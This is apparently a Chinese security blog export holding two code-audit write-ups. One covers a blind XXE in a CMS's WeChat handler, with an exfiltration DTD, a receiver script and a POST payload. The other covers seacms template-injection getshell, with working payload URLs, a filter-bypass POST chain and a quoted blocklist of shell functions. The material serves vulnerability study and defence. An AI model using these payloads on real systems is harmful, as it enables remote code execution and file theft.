alt=\"1\"></p>\n<p>整个过程不难，我主要想要总结的是这套系统运作后台数据库的方法和设计模式：</p>\n<p>由于用户使用的数据库扩展类型是未知的，所以代码需要根据不同情况选择不同的数据库连接:</p>\n<ul>\n<li>所有数据库对象的基类 <code>App/Core/Lib/Core/Db.class.php</code>,此系统支持 mysql 和 mysqli 两个扩展，根据选择情况来构建数据库对象，继承父类的一些声明和方法即可直接进行使用。</li>\n<li>工厂模式：工厂模式就是将创造对象的方法封装在一个文件的类函数里面，然后返回创建的对象，避免了 new 操作，而且当创建对象的方法或者参数改变的时候，我们可以直接修改工厂方法。</li>\n</ul>\n<p>这里的父类 Db.class.php 使用了工厂模式产生数据库对象，即 <strong>factory()</strong> 方法：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">factory</span><span class=\"hljs-params\">($db_config=<span class=\"hljs-string\">''</span>)</span> </span>&#123;<br>        <span class=\"hljs-comment\">// 读取数据库配置</span><br>        $db_config = <span class=\"hljs-keyword\">$this</span>-&gt;parseConfig($db_config);<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">empty</span>($db_config[<span class=\"hljs-string\">'dbms'</span>]))<br>            throw_exception(L(<span class=\"hljs-string\">'_NO_DB_CONFIG_'</span>));<br>        <span class=\"hljs-comment\">// 数据库类型</span><br>        <span class=\"hljs-keyword\">$this</span>-&gt;dbType = ucwords(strtolower($db_config[<span class=\"hljs-string\">'dbms'</span>]));<br>        $class = <span class=\"hljs-string\">'Db'</span>. <span class=\"hljs-keyword\">$this</span>-&gt;dbType;<br>        <span class=\"hljs-keyword\">if</span>(is_file(CORE_PATH.<span class=\"hljs-string\">'Driver/Db/'</span>.$class.<span class=\"hljs-string\">'.class.php'</span>)) &#123;<br>            <span class=\"hljs-comment\">// 内置驱动</span><br>            $path = CORE_PATH;<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123; <span class=\"hljs-comment\">// 扩展驱动</span><br>            $path = EXTEND_PATH;<br>        &#125;<br>        <span class=\"hljs-comment\">// 检查驱动类</span><br>        <span class=\"hljs-keyword\">if</span>(require_cache($path.<span class=\"hljs-string\">'Driver/Db/'</span>.$class.<span class=\"hljs-string\">'.class.php'</span>)) &#123;<br>            $db = <span class=\"hljs-keyword\">new</span> $class($db_config);<br>            <span class=\"hljs-comment\">// 获取当前的数据库类型</span><br>            <span class=\"hljs-keyword\">if</span>( <span class=\"hljs-string\">'pdo'</span> != strtolower($db_config[<span class=\"hljs-string\">'dbms'</span>]) )<br>                $db-&gt;dbType = strtoupper(<span class=\"hljs-keyword\">$this</span>-&gt;dbType);<br>            <span class=\"hljs-keyword\">else</span><br>                $db-&gt;dbType = <span class=\"hljs-keyword\">$this</span>-&gt;_getDsnType($db_config[<span class=\"hljs-string\">'dsn'</span>]);<br>            <span class=\"hljs-keyword\">if</span>(APP_DEBUG)  $db-&gt;debug    = <span class=\"hljs-keyword\">true</span>;<br>        &#125;<span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-comment\">// 类没有定义</span><br>            throw_exception(L(<span class=\"hljs-string\">'_NOT_SUPPORT_DB_'</span>).<span class=\"hljs-string\">': '</span> . $db_config[<span class=\"hljs-string\">'dbms'</span>]);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> $db;<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>然后在构造函数 __construct() 中使用此方法创建数据库对象：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($config=<span class=\"hljs-string\">''</span>)</span></span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">$this</span>-&gt;factory($config);<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>php 有很多设计模式我们可以了解和学习，<a href=\"https://www.imooc.com/learn/236\" target=\"_blank\" rel=\"noopener\">这里</a>是慕课的一个不错的免费讲解设计模式的课程。</p>\n<p>ps: 同样的分析方法还能发现一个前台 xss 漏洞。</p>\n<h1 id=\"3-前台-xxe\"><a href=\"#3-前台-xxe\" class=\"headerlink\" title=\"3@ 前台 xxe\"></a>3@ 前台 xxe</h1><p>以前一直觉得 xxe 这种漏洞很少会在实战中出现，这也算是自己第一次实战审出 xxe ,由于利用条件比较苛刻，没有上报到 cnvd 等平台，在此做下简单分析 (为了保护厂家隐私，此文章已经上密码，仅做笔记和供朋友参阅，望大家注意自身安全)。</p>\n<p>文件位置：</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-regexp\">/App/</span>Lib<span class=\"hljs-regexp\">/Common/Y</span>dWx.<span class=\"hljs-keyword\">class</span>.php<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 关键方法</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">responseMsg</span><span class=\"hljs-params\">()</span></span>&#123;<br>\t\t<span class=\"hljs-comment\">//$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t//get post data, May be due to the different environments</span><br>        $postStr = file_get_contents(<span class=\"hljs-string\">\"php://input\"</span>);<br>\t\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">empty</span>($postStr) ) <span class=\"hljs-keyword\">return</span>;<br>\t\t$HasCustomerService = $GLOBALS[<span class=\"hljs-string\">'Config'</span>][<span class=\"hljs-string\">'WX_CUSTOMER_SERVICE'</span>]; <span class=\"hljs-comment\">//是否启用多客服</span><br>\t\t<span class=\"hljs-comment\">//用户发送消息－&gt; 公众帐号</span><br>\t\t$postObj = simplexml_load_string($postStr, <span class=\"hljs-string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA);<br>\t\t......<br></code></pre></td></tr></table></figure>\n\n<p>可以看到，此方法将 post 流中的数据直接放入到 <code>simplexml_load_string()</code> 函数中，由于此方法未传入其他参数，所以只要有使用此方法的地方，必然会有 xxe 漏洞。</p>\n<p>由于本机未装 php 5.6 以下版本，所以本次测试环境为 :</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">os :</span> <span class=\"hljs-string\">win10</span><br><span class=\"hljs-attr\">php_version :</span> <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.45</span><br></code></pre></td></tr></table></figure>\n\n<p>网上很多文章都有写 libxml 2.9.1 以上的 php 默认会禁止加载外部实体，实际上 libxml 2.9.4 这一版的 php 依旧可以成功加载外部实体。因为 php 7.0 以上的版本集成的 libxml 还是有 2.9.4 版，所以此漏洞也是可以在 php7 上复现的，这个问题由 Cart0a 提出。具体禁用加载外部实体的 libxml 版本有待探索。</p>\n<p>由于是无回显形式的 xxe，所以我们需要构造一个数据接收方：</p>\n<ul>\n<li>我们先在本地上传模拟测试实体 <code>test.dtd</code></li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-meta-keyword\">file</span> <span class=\"hljs-meta-keyword\">SYSTEM</span> <span class=\"hljs-meta-string\">\"php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini\"</span>&gt;</span><br><span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-meta-keyword\">int</span> <span class=\"hljs-meta-string\">\"&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/receive.php?p=%file;'&gt;\"</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>然后构造接收脚本 <code>receive.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>file_put_contents(<span class=\"hljs-string\">\"result.txt\"</span>,$_GET[<span class=\"hljs-string\">'p'</span>]);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>最后将 payload 传入到 post 流中，偷取到的数据写入到 <code>result.txt</code> 文件中</li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-meta-keyword\">convert</span> [ <br><span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-meta-keyword\">remote</span> <span class=\"hljs-meta-keyword\">SYSTEM</span> <span class=\"hljs-meta-string\">\"http://127.0.0.1/test.dtd\"</span>&gt;</span><br>%remote;%int;%send;<br>]&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2\"></p>\n<p>【由于图片需要上传需要打码，复现可根据上文文字步骤进行】</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3\"></p>\n<p>成功偷到数据。</p>\n<p>暂时的防御办法就是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">libxml_disable_entity_loader(<span class=\"hljs-keyword\">true</span>);<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-其他\"><a href=\"#4-其他\" class=\"headerlink\" title=\"4@ 其他\"></a>4@ 其他</h1><p>此系统还存在前后台的 csrf 漏洞，xss漏洞，有兴趣可自行审计。</p>\n<p>Refererece：</p>\n<p><code>https://www.cnvd.org.cn/flaw/show/CNVD-2019-21447</code></p>\n"},{"title":"seacms_getshell 篇","date":"2019-08-16T16:00:00.000Z","_content":"\n\n\n\n\n## 1@ 前言\n\n换回我的 **小deepin了**，还是熟悉的味道，哈哈。配好所有之前的环境后，开始审计 ：）\n\n文章撰写时的审计环境：\n\n```\nserver : phpstudy\nsystem : win10\n```\n\n\n\n## 2@ seacms 各个版本的 getshell \n\n### 1. v_6.4.5 前台 getshell\n\n- 漏洞文件 **upload/search.php**\n\n我以为，初学审计的时候可以先看 payload，然后通过给出构造的参数形式了进行顺藤摸瓜。毕竟各大漏洞平台一般较不详细的时候也会给出几条简单的 poc_payload。我们先来看看这个版本的前台 getshell 的 payload。\n\n`http://IP/upload/search.php?searchtype=5&order=}{end if}{if:1)phpinfo();if(1}{end if}`\n\n#### 1.1 恶意 payload 的追踪\n\n​         首先，我们从上面的 payload 可以知晓可控参数为 **searchtype** 和 **order**，我们可以跟着 xdebug 完整的走一遍，较为清楚的了解漏洞存在的原因，和漏洞触发的条件（只列出漏洞相关的部分，相关逻辑功能的完成在这不细究）。\n\n```php\nrequire_once(\"include/common.php\");\nrequire_once(sea_INC.\"/main.class.php\");\n```\n\n文件开头包含了两个处理方法与处理参数的文件，其中 GPC 变量的传入的文件就包含在 **common.php**中。\n\n```php\nforeach(Array('_GET','_POST','_COOKIE') as $_request)\n{\n\tforeach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);\n}\n```\n\n这段 **common.php** 文件中的代码，将外部的 GPC 参数进行 php 代码层的赋值。\n\n\n\n再回到 **search.php**，来看看漏洞的直接关键点 **echoSearchpage()** 函数。\n\n```php\nglobal $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;\n$order = !empty($order)?$order:time;\n```\n\n函数开头将一些变量引用为全局变量，在函数内部使用。由第二句 order 变量的赋值，结合之前的外部变量赋值的方法，我们可以传入 order 参数进行变量覆盖。由 payload 可知，order字段里面是存在关键字眼 **phpinfo()**的，之后一定是经过了一系列的拼接和过滤，得到执行，我们在整个漏洞利用的在这条链里面就要紧盯着 order 参数的 `'成长历程'`。payload中的另一个参数是 searchtype ，赋值为5，所以我们跳转到代码的 65~76行。\n\n```php\nif(intval($searchtype)==5)\n\t{\n\t\t$searchTemplatePath = \"/templets/\".$GLOBALS['cfg_df_style'].\"/\".$GLOBALS['cfg_df_html'].\"/cascade.html\";\n\t\t$typeStr = !empty($tid)?intval($tid).'_':'0_';\n\t\t$yearStr = !empty($year)?PinYin($year).'_':'0_';\n\t\t$letterStr = !empty($letter)?$letter.'_':'0_';\n\t\t$areaStr = !empty($area)?PinYin($area).'_':'0_';\n\t\t$orderStr = !empty($order)?$order.'_':'0_';\n\t\t$jqStr = !empty($jq)?$jq.'_':'0_';\n\t\t$cacheName=\"parse_cascade_\".$typeStr.$yearStr.$letterStr.$areaStr.$orderStr; //构建cacheName\n\t\t$pSize = getPageSizeOnCache($searchTemplatePath,\"cascade\",\"\");  //获取输出页面大小\n```\n\n这段代码的大致意思是构造好模板文件的文件名，第一句得到构造模板文件的默认格式的文件名\n\n`/templets/default/html/cascade.html`\n\n然后开始拼接模板文件名，由于以上参数传入都为空，则由选择语句知道我们的最终文件名变量 $cacheName为:\n\n`parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_`\n\n**psize** 是输出文件页面的大小，默认在缓存文件里面保存，值为24.\n\n由于其他相关参数都为空，我们直接跟进到文件的第 145 行，来查看模板文件的处理方式。\n\n```php\nif($cfg_iscache){\n\t\tif(chkFileCache($cacheName)){\n\t\t\t$content = getFileCache($cacheName);\n\t\t}else{\n\t\t\t$content = parseSearchPart($searchTemplatePath);\n\t\t\tsetFileCache($cacheName,$content);\n\t\t}\n\t}else{\n\t\t\t$content = parseSearchPart($searchTemplatePath);\n\t}\n```\n\n变量 $cfg_iscache 默认传入为 1，所以我们跟进到 **chkFileCache()**函数里面。\n\n- 文件 /upload/include/inc/common_func.php\n\n```php\nfunction chkFileCache($cacheName)\n{\n\tglobal $cfg_cachetime,$cfg_cachemark;\n\t$cacheFile=sea_ROOT.'/data/cache/'.$cfg_cachemark.$cacheName.'.inc';\n\t$mintime = time() - $cfg_cachetime*60;\n\tif(!file_exists($cacheFile) || ( file_exists($cacheFile) && ($mintime > filemtime($cacheFile)))){\n\t\treturn false;\n\t}else{\n\t\treturn true;\n\t}\n}\n```\n\n这里的逻辑理解的关键点就在这句\n\n`if(!file_exists($cacheFile) || ( file_exists($cacheFile) && ($mintime > filemtime($cacheFile))))`\n\n我们在这设一个 $test 变量 \n\n ![1564321031968](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/1.png)\n\n看到这里是返回 false 的，由格式来看，只能是两边的判断式都为假时，最终的布尔值才会为假。所以，file_exists($cacheFile) 是成立的，也就是说，文件`D:/WWW/seacms_v6.4/upload/data/cache/E20121213155816parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_.inc` 存在。但实际上从本地来看，这个文件并不存在，只有一个相似的被截断的文件名 `E20121213155816parse_cascade_0_0_0_0_}{end if} {if` 存在，这是因为出现的 if 后面的冒号将文件名截断。但是 file_exists 函数仍然判断源文件存在。这想来是件很有趣的事情啊，这就引出来对 file_exists() 与 文件关系的讨论。\n\n#####  1.2.1 有趣的 file_exists()  和 ntfs 文件系统\n\n除了上面的那个情况外，还有一个点也能证明这个被截断文件名的文件是真实存在的。\n\n![1564363773307](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/2.png)\n\n \n\n思考一下：是否存在这种情况，操作系统的文件系统将文件写入的数据流保存到一个位置，但是显示的文件名是以它的命名规则显示，而真正的文件名是与写入数据流相互关联，可以用底层的编程语言打开那个完整文件名的文件，获取数据流？\n\n\n\n搜索无果后，在 p 神小密圈发问，得到了师傅们的指导，了解了一下 ntfs 文件系统。\n\n更多关于 ntfs 文件系统中的隐藏流的知识，请见我的另一篇博客：[ntfs 系统中的ADS供选数据流](https://www.59wlx.top/2019/08/17/ntfs%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84ADS%E4%BE%9B%E9%80%89%E6%95%B0%E6%8D%AE%E6%B5%81/)\n\n\n\n##### 1.2.2 继续跟踪审计\n\n好了，解决完上面的问题，我们接着来看审计。\n\n当我们第一次构造 payload 进行访问时，是不存在那个模板文件的，那么代码会走到另一个分支。\n\n\n\n```php\nif($cfg_iscache){\n\t\tif(chkFileCache($cacheName)){\n\t\t\t$content = getFileCache($cacheName);\n\t\t}else{\n\t\t\t$content = parseSearchPart($searchTemplatePath);\n\t\t\tsetFileCache($cacheName,$content);\n\t\t}\n\t}\n\n```\n\n\n\n在 chkFileCache() 函数返回 false 后，进入到 else 分支 ,执行获取 $content, 并对搜索的不存在模板文件进行写入。这也是我们之后访问那个模板文件中内容的由来，即可以一次或多次执行 phpinfo()。\n\n```php\nfunction parseSearchPart($templatePath)\n{\n\tglobal $mainClassObj,$tid;\n\t$currentTypeId = empty($tid)?0:$tid;\n\t$content=loadFile(sea_ROOT.$templatePath);\n\t$content=$mainClassObj->parseTopAndFoot($content);\n\t$content=$mainClassObj->parseAreaList($content);\n\t$content=$mainClassObj->parseHistory($content);\n\t$content=$mainClassObj->parseSelf($content);\n\t$content=$mainClassObj->parseGlobal($content);\n\t$content=$mainClassObj->parseMenuList($content,\"\",$currentTypeId);\n\t$content=$mainClassObj->parseVideoList($content,$currentTypeId);\n\t$content=$mainClassObj->parsenewsList($content,$currentTypeId);\n\t$content=$mainClassObj->parseTopicList($content);\n\treturn $content;\n}\n```\n\n这个函数获取模板文件的默认格式，然后进行替换赋值。\n\n之后就进入到了关键的模板内容替换的部分：\n\n\n\n```php\n$content = str_replace(\"{searchpage:page}\",$page,$content);\n\techo $content;\n\t$content = str_replace(\"{seacms:searchword}\",$searchword,$content);\n\t$content = str_replace(\"{seacms:searchnum}\",$TotalResult,$content);\n\t$content = str_replace(\"{searchpage:ordername}\",$order,$content);\n......\n```\n\n我只列出我们可控的部分，关键就在 $order 这个参数，我们结合 $content 获取到的模板文件的内容，来观察替换后的亚子。模板内容如下：\n\n```html\n      <a href=\"{searchpage:order-time-link}\" {if:\"{searchpage:ordername}\"==\"time\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderhits\">最新上映</a>\n      <a href=\"{searchpage:order-hit-link}\" {if:\"{searchpage:ordername}\"==\"hit\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderaddtime\">最近热播</a>\n      <a href=\"{searchpage:order-score-link}\" {if:\"{searchpage:ordername}\"==\"score\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"ordergold\">评分最高</a>\n \n```\n\n可以看到，模板文件中有3次出现 ordername，这也就可以解释为什么 payload 触发漏洞之后，执行了三次 phpifno()\n\n结合我们的 payload，我们可以知道模板文件替换位置最终的形式如下：\n\n```html\n<a href=\"{searchpage:order-time-link}\" {if:\"}{end if}{if:1)phpinfo();if(1}{end if}\"==\"time\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderhits\">\n```\n\n这里的 `}`,作用就是在 eval 的时候保证逻辑与语法的正确性，保证之后的代码可以被正确执行。\n\n模板文件内容替换后，进入到最最关键的一步：\n\n`$content=$mainClassObj->parseIf($content);`\n\n跟进到 parseIf 函数：\n\n```php\nfunction parseIf($content){\n\t\tif (strpos($content,'{if:')=== false){\n\t\treturn $content;\n\t\t}else{\n\t\t// echo $content;\n\t\t$labelRule = buildregx(\"{if:(.*?)}(.*?){end if}\",\"is\");\n\t\t$labelRule2=\"{elseif\";\n\t\t$labelRule3=\"{else}\";\n\t\tpreg_match_all($labelRule,$content,$iar);\n\t\t$arlen=count($iar[0]);\n\t\t// var_dump($iar[0]);\n\t\t$elseIfFlag=false;\n\t\tfor($m=0;$m<$arlen;$m++){\n\t\t\t$strIf=$iar[1][$m];\n\t\t\t$strIf=$this->parseStrIf($strIf);\n\t\t\t$strThen=$iar[2][$m];\n\t\t\t$strThen=$this->parseSubIf($strThen);\n\t\t\tif (strpos($strThen,$labelRule2)===false){\n\t\t\t\tif (strpos($strThen,$labelRule3)>=0){\n\t\t\t\t\t$elsearray=explode($labelRule3,$strThen);\n\t\t\t\t\t$strThen1=$elsearray[0];\n\t\t\t\t\t$strElse1=$elsearray[1];\n\t\t\t\t\t@eval(\"if(\".$strIf.\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");\n```\n\n由正则式可知 $iar[0] 数组得到的是所有满足 `{if:【内容】}【内容】{end if}` 这种形式的匹配结果\n\n回头来看看我们刚刚替换后的关键部分的模板内容：\n\n`<a href=\"{searchpage:order-time-link}\" {if:\"}{end if}{if:1)phpinfo();if(1}{end if}\"==\"time\"}`\n\n是满足匹配规则的，重要内容保存在 $iar[1]中。这里我们直接定位到最终执行 payload 的语句中。\n\n`@eval(\"if(\".$strIf.\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");`\n\n跟踪 $strIf 变量，经过了两次处理\n\n```php\n$strIf=$iar[1][$m];\n$strIf=$this->parseStrIf($strIf);\n```\n\n上面说过，最终的 payload 关键内容会保存在 $iar[1] 中，所以经过 for 遍历，$strIf 一定可以被赋值为带有 phpinfo() 的字符串。\n\n跟进到 parseStrIf() 函数。\n\n```php\n\tfunction parseStrIf($strIf)\n\t{\n\t\tif(strpos($strIf,'=')===false)\n\t\t{\n\t\t\treturn $strIf;\n\t\t}\n\t\tif((strpos($strIf,'==')===false)&&(strpos($strIf,'=')>0))\n\t\t{\n\t\t\t$strIf=str_replace('=', '==', $strIf);\n\t\t}\n\t\t$strIfArr =  explode('==',$strIf);\n\t\treturn (empty($strIfArr[0])?'NULL':$strIfArr[0]).\"==\".(empty($strIfArr[1])?'NULL':$strIfArr[1]);\n\t}\n```\n\n当下我们的 $strIf 为 `1)phpinfo();if(1`\n\n其中没有 **=** ，所以直接返回原内容。所以最后 eval() 函数执行的内容就为\n\n`@eval(\"if(1)phpinfo();if(1){\\$ifFlag=true;}else{\\$ifFlag=false;}\");`\n\n代码就会顺利得到执行。\n\n这里纠正一下引用文章的一个说法，`$labelRule = buildregx(\"{if:(.*?)}(.*?){end if}\",\"is\");`\n\n这个正则式并不是贪婪匹配，而是使用  **？** 来取消了贪婪匹配。每次只匹配一个结果，并不向后延伸，而匹配到所有结果是函数 **preg_match_all()** 的作用。\n\n#### 1.2 结果分析\n\n这个漏洞利用的十分巧妙。先利用可控变量替换模板中的内容，然后进行模板内容提取，最后正则匹配执行代码。但是说到底，挖掘漏洞的人肯定也是从 eval() 这个危险函数出发，逐步回退，找到可控参数，然后一步步的构造payload，这是典型的一个白盒挖掘漏洞的思路，`回溯参数`的方法。\n\n但是 php7 版本以上此漏洞却不能利用，原因是之前匹配到的 `\"` 使得 eval() 函数不能正确执行，导致后面的代码停止执行。\n\n测试代码如下：\n\n```php\n<?php\n$test = array(1,2,3,'\"',\"1)phpinfo();if(1\");\nfor ($i=0;$i<5;$i++){\n    @eval(\"if(\".$test[$i].\") { \\$ifFlag=true;} else{ \\$ifFlag=false;}\");\n}\n?>\n```\n\nphp5 下的执行结果\n\n  ![](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/4.png)\n\nphp7 下的执行结果\n\n ![](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/5.png)\n\n可以看出，单从 eval() 函数的使用上来说，php7 对于语法的正确性要求更加严格。\n\n\n\n### 2、v_6.5.4 前台 getshell\n\n在这个版本的代码中，将上面讲到的 **$order** 变量也进行了特殊字符的检测 \n\n ![6](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/6.png)\n\n\n\n跟进到 RemoveXSS 函数里面，可以看出是一个基于黑名单的 xss 关键字过滤的方法。\n\n```php\nfunction RemoveXSS($val) {  \n\n   $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val);  \n  \n   $search = 'abcdefghijklmnopqrstuvwxyz'; \n   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  \n   $search .= '1234567890!@#$%^&*()'; \n   $search .= '~`\";:?+/={}[]-_|\\'\\\\'; \n   for ($i = 0; $i < strlen($search); $i++) { \n \n      $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); \n      $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ; \n   } \n   \n   $ra1 = Array('_GET','_POST','_COOKIE','_REQUEST','if:','javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base', 'eval', 'passthru', 'exec', 'assert', 'system', 'chroot', 'chgrp', 'chown', 'shell_exec', 'proc_open', 'ini_restore', 'dl', 'readlink', 'symlink', 'popen', 'stream_socket_server', 'pfsockopen', 'putenv', 'cmd','base64_decode','fopen','fputs','replace','input','contents'); \n   $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); \n   $ra = array_merge($ra1, $ra2); \n\n    ......\n    \n   return $val;  \n}   \n```\n\n其中，黑名单数组的第一组 $ra1 中的第5项添加了 `if:` 这个黑名单匹配项，还加了另外其他的几个匹配项\n\n```\n'_GET','_POST','_COOKIE','_REQUEST'\n```\n\n所以 v_6.4.5 版本的 payload 会因为逻辑关系的不成立，因此在 eval() 函数中得不到执行。\n\n\n\n那么我们来看看这个版本的脑洞版 payload \n\n```php\n文件：\nsearch.php\n\nPOST 内容：\nsearchtype=5\n&searchword={if{searchpage:year}\n&year=:e{searchpage:area}}\n&area=v{searchpage:letter}\n&letter=al{searchpage:lang}\n&yuyan=(join{searchpage:jq}\n&jq=($_P{searchpage:ver}\n&ver=OST[9]))\n&9[]=ph\n&9[]=pinfo();\n\n// 传递拼接为 